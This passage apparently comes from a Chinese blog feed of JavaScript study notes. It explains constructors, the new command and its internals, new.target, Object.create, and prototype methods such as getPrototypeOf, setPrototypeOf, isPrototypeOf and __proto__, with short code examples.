<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Vehicle = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.price = <span class="number">1000</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Vehicle</code>就是构造函数。为了与普通函数区别，构造函数名字的第一个字母通常大写。</p>
<p>构造函数的特点有两个。</p>
<ul>
<li>函数体内部使用了<code>this</code>关键字，代表了所要生成的对象实例。</li>
<li>生成对象的时候，必须使用<code>new</code>命令。</li>
</ul>
<h4 id="1-3-new-命令"><a href="#1-3-new-命令" class="headerlink" title="1.3 new 命令"></a>1.3 new 命令</h4><h5 id="1-3-1基本用法"><a href="#1-3-1基本用法" class="headerlink" title="1.3.1基本用法"></a>1.3.1基本用法</h5><p><code>new</code>命令的作用，就是执行构造函数，返回一个实例对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Vehicle = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.price = <span class="number">1000</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> v = <span class="keyword">new</span> Vehicle();</span><br><span class="line">v.price <span class="comment">// 1000</span></span><br></pre></td></tr></table></figure>
<p>上面代码通过<code>new</code>命令，让构造函数<code>Vehicle</code>生成一个实例对象，保存在变量<code>v</code>中。这个新生成的实例对象，从构造函数<code>Vehicle</code>得到了<code>price</code>属性。<code>new</code>命令执行时，构造函数内部的<code>this</code>，就代表了新生成的实例对象，<code>this.price</code>表示实例对象有一个<code>price</code>属性，值是<code>1000</code>。<br>使用<code>new</code>命令时，根据需要，构造函数也可以接受参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Vehicle = <span class="function"><span class="keyword">function</span> (<span class="params">p</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.price = p;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> v = <span class="keyword">new</span> Vehicle(<span class="number">500</span>);</span><br></pre></td></tr></table></figure>
<p><code>new</code>命令本身就可以执行构造函数，所以后面的构造函数可以带括号，也可以不带括号。下面两行代码是等价的，但是为了表示这里是函数调用，推荐使用括号。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 推荐的写法</span></span><br><span class="line"><span class="keyword">var</span> v = <span class="keyword">new</span> Vehicle();</span><br><span class="line"><span class="comment">// 不推荐的写法</span></span><br><span class="line"><span class="keyword">var</span> v = <span class="keyword">new</span> Vehicle;</span><br></pre></td></tr></table></figure>
<p>一个很自然的问题是，如果忘了使用<code>new</code>命令，直接调用构造函数会发生什么事？<br>这种情况下，构造函数就变成了普通函数，并不会生成实例对象。而且由于后面会说到的原因，<code>this</code>这时代表全局对象，将造成一些意想不到的结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Vehicle = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.price = <span class="number">1000</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> v = Vehicle();</span><br><span class="line">v <span class="comment">// undefined</span></span><br><span class="line">price <span class="comment">// 1000</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，调用<code>Vehicle</code>构造函数时，忘了加上<code>new</code>命令。结果，变量<code>v</code>变成了<code>undefined</code>，而<code>price</code>属性变成了全局变量。因此，应该非常小心<br>为了保证构造函数必须与<code>new</code>命令一起使用，一个解决办法是，构造函数内部使用严格模式，即第一行加上<code>use strict</code>。这样的话，一旦忘了使用<code>new</code>命令，直接调用构造函数就会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Fubar</span>(<span class="params">foo, bar</span>)</span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="built_in">this</span>._foo = foo;</span><br><span class="line">  <span class="built_in">this</span>._bar = bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Fubar()</span><br><span class="line"><span class="comment">// TypeError: Cannot set property &#x27;_foo&#x27; of undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码的<code>Fubar</code>为构造函数，<code>use strict</code>命令保证了该函数在严格模式下运行。由于严格模式中，函数内部的<code>this</code>不能指向全局对象，默认等于<code>undefined</code>，导致不加<code>new</code>调用会报错（JavaScript 不允许对<code>undefined</code>添加属性）。<br>另一个解决办法，构造函数内部判断是否使用<code>new</code>命令，如果发现没有使用，则直接返回一个实例对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Fubar</span>(<span class="params">foo, bar</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!(<span class="built_in">this</span> <span class="keyword">instanceof</span> Fubar)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Fubar(foo, bar);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">this</span>._foo = foo;</span><br><span class="line">  <span class="built_in">this</span>._bar = bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Fubar(<span class="number">1</span>, <span class="number">2</span>)._foo <span class="comment">// 1</span></span><br><span class="line">(<span class="keyword">new</span> Fubar(<span class="number">1</span>, <span class="number">2</span>))._foo <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中的构造函数，不管加不加<code>new</code>命令，都会得到同样的结果。</p>
<h5 id="1-3-2-new-命令的原理"><a href="#1-3-2-new-命令的原理" class="headerlink" title="1.3.2 new 命令的原理"></a>1.3.2 new 命令的原理</h5><p>使用<code>new</code>命令时，它后面的函数依次执行下面的步骤。</p>
<ol>
<li>创建一个空对象，作为将要返回的对象实例。</li>
<li>将这个空对象的原型，指向构造函数的<code>prototype</code>属性。</li>
<li>将这个空对象赋值给函数内部的<code>this</code>关键字。</li>
<li>开始执行构造函数内部的代码。</li>
</ol>
<p>也就是说，构造函数内部，<code>this</code>指的是一个新生成的空对象，所有针对<code>this</code>的操作，都会发生在这个空对象上。构造函数之所以叫“构造函数”，就是说这个函数的目的，就是操作一个空对象（即<code>this</code>对象），将其“构造”为需要的样子。<br>如果构造函数内部有<code>return</code>语句，而且<code>return</code>后面跟着一个对象，<code>new</code>命令会返回<code>return</code>语句指定的对象；否则，就会不管<code>return</code>语句，返回<code>this</code>对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Vehicle = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.price = <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1000</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Vehicle()) === <span class="number">1000</span></span><br><span class="line"><span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，构造函数<code>Vehicle</code>的<code>return</code>语句返回一个数值。这时，<code>new</code>命令就会忽略这个<code>return</code>语句，返回“构造”后的<code>this</code>对象。<br>但是，如果<code>return</code>语句返回的是一个跟<code>this</code>无关的新对象，<code>new</code>命令会返回这个新对象，而不是<code>this</code>对象。这一点需要特别引起注意。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Vehicle = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.price = <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">price</span>: <span class="number">2000</span> &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Vehicle()).price</span><br><span class="line"><span class="comment">// 2000</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，构造函数<code>Vehicle</code>的<code>return</code>语句，返回的是一个新对象。<code>new</code>命令会返回这个对象，而不是<code>this</code>对象。<br>另一方面，如果对普通函数（内部没有<code>this</code>关键字的函数）使用<code>new</code>命令，则会返回一个空对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMessage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;this is a message&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> msg = <span class="keyword">new</span> getMessage();</span><br><span class="line"></span><br><span class="line">msg <span class="comment">// &#123;&#125;</span></span><br><span class="line"><span class="keyword">typeof</span> msg <span class="comment">// &quot;object&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>getMessage</code>是一个普通函数，返回一个字符串。对它使用<code>new</code>命令，会得到一个空对象。这是因为<code>new</code>命令总是返回一个对象，要么是实例对象，要么是<code>return</code>语句指定的对象。本例中，<code>return</code>语句返回的是字符串，所以<code>new</code>命令就忽略了该语句。<br><code>new</code>命令简化的内部流程，可以用下面的代码表示。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_new</span>(<span class="params"><span class="comment">/* 构造函数 */</span> constructor, <span class="comment">/* 构造函数参数 */</span> params</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 将 arguments 对象转为数组</span></span><br><span class="line">  <span class="keyword">var</span> args = [].slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">  <span class="comment">// 取出构造函数</span></span><br><span class="line">  <span class="keyword">var</span> <span class="title">constructor</span> = <span class="title">args</span>.<span class="title">shift</span>(<span class="params"></span>);</span><br><span class="line">  <span class="comment">// 创建一个空对象，继承构造函数的 prototype 属性</span></span><br><span class="line">  <span class="keyword">var</span> context = <span class="built_in">Object</span>.create(<span class="title">constructor</span>.<span class="title">prototype</span>);</span><br><span class="line">  <span class="comment">// 执行构造函数</span></span><br><span class="line">  <span class="keyword">var</span> result = <span class="title">constructor</span>.<span class="title">apply</span>(<span class="params">context, args</span>);</span><br><span class="line">  <span class="comment">// 如果返回结果是对象，就直接返回，否则返回 context 对象</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">typeof</span> result === <span class="string">&#x27;object&#x27;</span> &amp;&amp; result != <span class="literal">null</span>) ? result : context;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例</span></span><br><span class="line"><span class="keyword">var</span> actor = _new(Person, <span class="string">&#x27;张三&#x27;</span>, <span class="number">28</span>);</span><br></pre></td></tr></table></figure>

<h5 id="1-3-3-new-target"><a href="#1-3-3-new-target" class="headerlink" title="1.3.3 new.target"></a>1.3.3 new.target</h5><p>函数内部可以使用<code>new.target</code>属性。如果当前函数是<code>new</code>命令调用，<code>new.target</code>指向当前函数，否则为<code>undefined</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">new</span>.target === f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f() <span class="comment">// false</span></span><br><span class="line"><span class="keyword">new</span> f() <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>使用这个属性，可以判断函数调用的时候，是否使用new命令</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">new</span>.target) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;请使用 new 命令调用！&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f() <span class="comment">// Uncaught Error: 请使用 new 命令调用！</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，构造函数<code>f</code>调用时，没有使用<code>new</code>命令，就抛出一个错误</p>
<h4 id="1-4-Object-create-创建实例对象"><a href="#1-4-Object-create-创建实例对象" class="headerlink" title="1.4 Object.create() 创建实例对象"></a>1.4 Object.create() 创建实例对象</h4><p>构造函数作为模板，可以生成实例对象。但是，有时拿不到构造函数，只能拿到一个现有的对象。我们希望以这个现有的对象作为模板，生成新的实例对象，这时就可以使用<code>Object.create()</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  name: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  age: <span class="number">38</span>,</span><br><span class="line">  greeting: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Hi! I\&#x27;m &#x27;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person2 = <span class="built_in">Object</span>.create(person1);</span><br><span class="line"></span><br><span class="line">person2.name <span class="comment">// 张三</span></span><br><span class="line">person2.greeting() <span class="comment">// Hi! I&#x27;m 张三.</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对象<code>person1</code>是<code>person2</code>的模板，后者继承了前者的属性和方法。</p>
<p><code>Object.create()</code>的详细介绍，请看后面的相关章节</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS面向对象编程-实例对象与new命令</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0029</title>
    <url>/2021/05/20/%E6%89%93%E5%8D%A10029/</url>
    <content><![CDATA[<p><font color=#0080FF>我是只化身孤岛的蓝鲸 有着最巨大的身影 鱼虾在身侧穿行 也有飞鸟在背上停</font></p>
<h2 id="JS面向对象编程"><a href="#JS面向对象编程" class="headerlink" title="JS面向对象编程"></a>JS面向对象编程</h2><h3 id="4-Object对象的相关方法"><a href="#4-Object对象的相关方法" class="headerlink" title="4. Object对象的相关方法"></a>4. Object对象的相关方法</h3><h4 id="4-1-Object-getPrototypeOf"><a href="#4-1-Object-getPrototypeOf" class="headerlink" title="4.1 Object.getPrototypeOf()"></a>4.1 Object.getPrototypeOf()</h4><p><code>Object.getPrototypeOf</code>方法返回参数对象的原型。这是获取原型对象的标准方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> F = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> F();</span><br><span class="line"><span class="built_in">Object</span>.getPrototypeOf(f) === F.prototype <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，实例对象<code>f</code>的原型是<code>F.prototype</code>。<br>下面是几种特殊对象的原型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 空对象的原型是 Object.prototype</span></span><br><span class="line"><span class="built_in">Object</span>.getPrototypeOf(&#123;&#125;) === <span class="built_in">Object</span>.prototype <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Object.prototype 的原型是 null</span></span><br><span class="line"><span class="built_in">Object</span>.getPrototypeOf(<span class="built_in">Object</span>.prototype) === <span class="literal">null</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数的原型是 Function.prototype</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="built_in">Object</span>.getPrototypeOf(f) === <span class="built_in">Function</span>.prototype <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h4 id="4-2-Object-setPrototypeOf"><a href="#4-2-Object-setPrototypeOf" class="headerlink" title="4.2 Object.setPrototypeOf()"></a>4.2 Object.setPrototypeOf()</h4><p><code>Object.setPrototypeOf</code>方法为参数对象设置原型，返回该参数对象。它接受两个参数，第一个是现有对象，第二个是原型对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> b = &#123;<span class="attr">x</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(a, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.getPrototypeOf(a) === b <span class="comment">// true</span></span><br><span class="line">a.x <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Object.setPrototypeOf</code>方法将对象<code>a</code>的原型，设置为对象<code>b</code>，因此<code>a</code>可以共享<code>b</code>的属性。</p>
<p><code>new</code>命令可以使用<code>Object.setPrototypeOf</code>方法模拟。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> F = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.foo = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> F();</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="built_in">Object</span>.setPrototypeOf(&#123;&#125;, F.prototype);</span><br><span class="line">F.call(f);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>new</code>命令新建实例对象，其实可以分成两步。第一步，将一个空对象的原型设为构造函数的<code>prototype</code>属性（上例是<code>F.prototype</code>）；第二步，将构造函数内部的<code>this</code>绑定这个空对象，然后执行构造函数，使得定义在<code>this</code>上面的方法和属性（上例是<code>this.foo</code>），都转移到这个空对象上。</p>
<h4 id="4-3-Object-create"><a href="#4-3-Object-create" class="headerlink" title="4.3 Object.create()"></a>4.3 Object.create()</h4><p>生成实例对象的常用方法是，使用<code>new</code>命令让构造函数返回一个实例。但是很多时候，只能拿到一个实例对象，它可能根本不是由构建函数生成的，那么能不能从一个实例对象，生成另一个实例对象呢？</p>
<p>JavaScript 提供了<code>Object.create()</code>方法，用来满足这种需求。该方法接受一个对象作为参数，然后以它为原型，返回一个实例对象。该实例完全继承原型对象的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 原型对象</span></span><br><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">  print: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例对象</span></span><br><span class="line"><span class="keyword">var</span> B = <span class="built_in">Object</span>.create(A);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.getPrototypeOf(B) === A <span class="comment">// true</span></span><br><span class="line">B.print() <span class="comment">// hello</span></span><br><span class="line">B.print === A.print <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Object.create()</code>方法以<code>A</code>对象为原型，生成了<code>B</code>对象。<code>B</code>继承了<code>A</code>的所有属性和方法。</p>
<p>实际上，<code>Object.create()</code>方法可以用下面的代码代替。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">Object</span>.create !== <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">  <span class="built_in">Object</span>.create = <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">    F.prototype = obj;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> F();</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码表明，<code>Object.create()</code>方法的实质是新建一个空的构造函数<code>F</code>，然后让<code>F.prototype</code>属性指向参数对象<code>obj</code>，最后返回一个<code>F</code>的实例，从而实现让该实例继承<code>obj</code>的属性。</p>
<p>下面三种方式生成的新对象是等价的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = <span class="built_in">Object</span>.create(&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> obj2 = <span class="built_in">Object</span>.create(<span class="built_in">Object</span>.prototype);</span><br><span class="line"><span class="keyword">var</span> obj3 = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br></pre></td></tr></table></figure>
<p>如果想要生成一个不继承任何属性（比如没有<code>toString()</code>和<code>valueOf()</code>方法）的对象，可以将<code>Object.create()</code>的参数设为<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">obj.valueOf()</span><br><span class="line"><span class="comment">// TypeError: Object [object Object] has no method &#x27;valueOf&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对象<code>obj</code>的原型是<code>null</code>，它就不具备一些定义在<code>Object.prototype</code>对象上面的属性，比如<code>valueOf()</code>方法。</p>
<p>使用<code>Object.create()</code>方法的时候，必须提供对象原型，即参数不能为空，或者不是对象，否则会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.create()</span><br><span class="line"><span class="comment">// TypeError: Object prototype may only be an Object or null</span></span><br><span class="line"><span class="built_in">Object</span>.create(<span class="number">123</span>)</span><br><span class="line"><span class="comment">// TypeError: Object prototype may only be an Object or null</span></span><br></pre></td></tr></table></figure>
<p><code>Object.create()</code>方法生成的新对象，动态继承了原型。在原型上添加或修改任何方法，会立刻反映在新对象之上。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123; <span class="attr">p</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj2 = <span class="built_in">Object</span>.create(obj1);</span><br><span class="line"></span><br><span class="line">obj1.p = <span class="number">2</span>;</span><br><span class="line">obj2.p <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，修改对象原型<code>obj1</code>会影响到实例对象<code>obj2</code>。</p>
<p>除了对象的原型，<code>Object.create()</code>方法还可以接受第二个参数。该参数是一个属性描述对象，它所描述的对象属性，会添加到实例对象，作为该对象自身的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.create(&#123;&#125;, &#123;</span><br><span class="line">  p1: &#123;</span><br><span class="line">    value: <span class="number">123</span>,</span><br><span class="line">    enumerable: <span class="literal">true</span>,</span><br><span class="line">    configurable: <span class="literal">true</span>,</span><br><span class="line">    writable: <span class="literal">true</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  p2: &#123;</span><br><span class="line">    value: <span class="string">&#x27;abc&#x27;</span>,</span><br><span class="line">    enumerable: <span class="literal">true</span>,</span><br><span class="line">    configurable: <span class="literal">true</span>,</span><br><span class="line">    writable: <span class="literal">true</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.create(&#123;&#125;);</span><br><span class="line">obj.p1 = <span class="number">123</span>;</span><br><span class="line">obj.p2 = <span class="string">&#x27;abc&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><code>Object.create()</code>方法生成的对象，继承了它的原型对象的构造函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">Object</span>.create(a);</span><br><span class="line"></span><br><span class="line">b.constructor === A <span class="comment">// true</span></span><br><span class="line">b <span class="keyword">instanceof</span> A <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>b</code>对象的原型是<code>a</code>对象，因此继承了<code>a</code>对象的构造函数<code>A</code></p>
<h4 id="4-4-Object-prototype-isPrototypeOf"><a href="#4-4-Object-prototype-isPrototypeOf" class="headerlink" title="4.4 Object.prototype.isPrototypeOf()"></a>4.4 Object.prototype.isPrototypeOf()</h4><p>实例对象的<code>isPrototypeOf</code>方法，用来判断该对象是否为参数对象的原型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> o2 = <span class="built_in">Object</span>.create(o1);</span><br><span class="line"><span class="keyword">var</span> o3 = <span class="built_in">Object</span>.create(o2);</span><br><span class="line"></span><br><span class="line">o2.isPrototypeOf(o3) <span class="comment">// true</span></span><br><span class="line">o1.isPrototypeOf(o3) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>o1</code>和<code>o2</code>都是<code>o3</code>的原型。这表明只要实例对象处在参数对象的原型链上，<code>isPrototypeOf</code>方法都返回<code>true</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.isPrototypeOf(&#123;&#125;) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.isPrototypeOf([]) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.isPrototypeOf(<span class="regexp">/xyz/</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.isPrototypeOf(<span class="built_in">Object</span>.create(<span class="literal">null</span>)) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，由于<code>Object.prototype</code>处于原型链的最顶端，所以对各种实例都返回<code>true</code>，只有直接继承自<code>null</code>的对象除外。</p>
<h4 id="4-5-Object-prototype-proto"><a href="#4-5-Object-prototype-proto" class="headerlink" title="4.5 Object.prototype.proto"></a>4.5 Object.prototype.<strong>proto</strong></h4><p>实例对象的<code>__proto__</code>属性（前后各两个下划线），返回该对象的原型。该属性可读写。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> p = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">obj.__proto__ = p;</span><br><span class="line"><span class="built_in">Object</span>.getPrototypeOf(obj) === p <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码通过<code>__proto__</code>属性，将<code>p</code>对象设为<code>obj</code>对象的原型。</p>
<p>根据语言标准，<code>__proto__</code>属性只有浏览器才需要部署，其他环境可以没有这个属性。它前后的两根下划线，表明它本质是一个内部属性，不应该对使用者暴露。因此，应该尽量少用这个属性，而是用<code>Object.getPrototypeOf()</code>和<code>Object.setPrototypeOf()</code>，进行原型对象的读写操作。</p>
<p>原型链可以用<code>__proto__</code>很直观地表示。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">  name: <span class="string">&#x27;张三&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> B = &#123;</span><br><span class="line">  name: <span class="string">&#x27;李四&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> proto = &#123;</span><br><span class="line">  print: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">A.__proto__ = proto;</span><br><span class="line">B.__proto__ = proto;</span><br><span class="line"></span><br><span class="line">A.print() <span class="comment">// 张三</span></span><br><span class="line">B.print() <span class="comment">// 李四</span></span><br><span class="line"></span><br><span class="line">A.print === B.print <span class="comment">// true</span></span><br><span class="line">A.print === proto.print <span class="comment">// true</span></span><br><span class="line">B.print === proto.print <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>A</code>对象和<code>B</code>对象的原型都是<code>proto</code>对象，它们都共享<code>proto</code>对象的<code>print</code>方法。也就是说，<code>A</code>和<code>B</code>的<code>print</code>方法，都是在调用<code>proto</code>对象的<code>print</code>方法。</p>
<h4 id="4-6-获取原型对象方法的比较"><a href="#4-6-获取原型对象方法的比较" class="headerlink" title="4.6 获取原型对象方法的比较"></a>4.6 获取原型对象方法的比较</h4><p>如前所述，<code>__proto__</code>属性指向当前对象的原型对象，即构造函数的<code>prototype</code>属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"></span><br><span class="line">obj.__proto__ === <span class="built_in">Object</span>.prototype</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line">obj.__proto__ === obj.constructor.prototype</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码首先新建了一个对象<code>obj</code>，它的<code>__proto__</code>属性，指向构造函数（<code>Object</code>或<code>obj.constructor</code>）的<code>prototype</code>属性。</p>
